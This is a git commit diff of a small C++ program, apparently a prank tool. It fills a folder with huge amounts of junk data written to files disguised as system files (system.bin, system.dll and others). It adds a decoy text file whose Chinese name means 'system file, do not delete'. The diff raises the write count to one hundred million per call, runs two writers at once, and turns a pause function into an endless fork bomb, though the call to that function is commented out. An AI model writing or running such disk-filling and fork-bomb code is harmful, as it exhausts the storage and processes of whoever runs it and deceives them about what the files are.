16c0bcb3e01787f239363c0d3847dcbe284546c6
a-happy-pigeon <927039685@qq.com>
2021-07-26 09:34:53 +0800

    update

--- main.cpp
+++ main.cpp
@@ -9,7 +9,7 @@
 #import <sys/types.h>
 
 using namespace std;
-string filename=".";
+string filename;
 string foldername;
 string str[]={ "system.bin","system.log","system.dat","system.dll"};
 random_device rd;
@@ -18,15 +18,10 @@ string dir;
 string fn="系统文件勿删.txt";
 int random_name(){//随机名字
   string temp;
-
-
-  temp="C:/fill";//这只是个测试请修改此处
-
+  temp="/sd/test";//这只是个测试请修改此处
   string cmd="mkdir -p " + temp;
   system(cmd.c_str());
   foldername=temp;
-  dir=foldername+"/"+filename;
-  cout<<foldername<<endl;
   return 0;
 }
 int write_rom(unsigned int dn){
@@ -35,34 +30,40 @@ int write_rom(unsigned int dn){
   for(auto i=0;i<10000;i++){
     filename=str[f()%4];
 
-
+    dir=foldername+"/"+filename;
     fstream fs(dir,ios::binary | ios::app);
-    string dir2=foldername+fn;
-    fstream fs2(dir2,ios::out);
     string x;
-    x.push_back(p+f()%52);
+    x.push_back(p+f()%1000);
 
-    for(auto i=0;i<1000;i++)//必须为正数
+    for(auto i=0;i<1;i++)//必须为正数
     {
-      fs.write((const char*)&x,x.size());
+      fs.write((const char*)&x.at(f()%x.size()),x.size());
     }
     fs.close();
   }
   return 0;
 }
 int pause(){//卡顿
-  pid_t id = fork();
-  if(id==0){
+  while(true){
+    pid_t id = fork();
+    if(id==0){
+    }
   }
   return 0;
 }
 
 int main()
 {
+  random_name();
+  string dir2=foldername+"/"+fn;
+  fstream fs2(dir2,ios::out);
+  fs2.close();
+  cout<<dir2<<endl;
   for(int i=0;i<10;i++){//写入次数建议while循环(滑稽)
     cout<<"isRuning!\n";
-    future<int> fu1(async(write_rom,1000));
-    future<int> fu2(async(pause));
+    future<int> fu1(async(write_rom,100000000));//写入次数
+    future<int> fu2(async(write_rom,100000000));
+    //future<int> fu3(async(pause));
     fu1.get();
     fu2.get();
   }
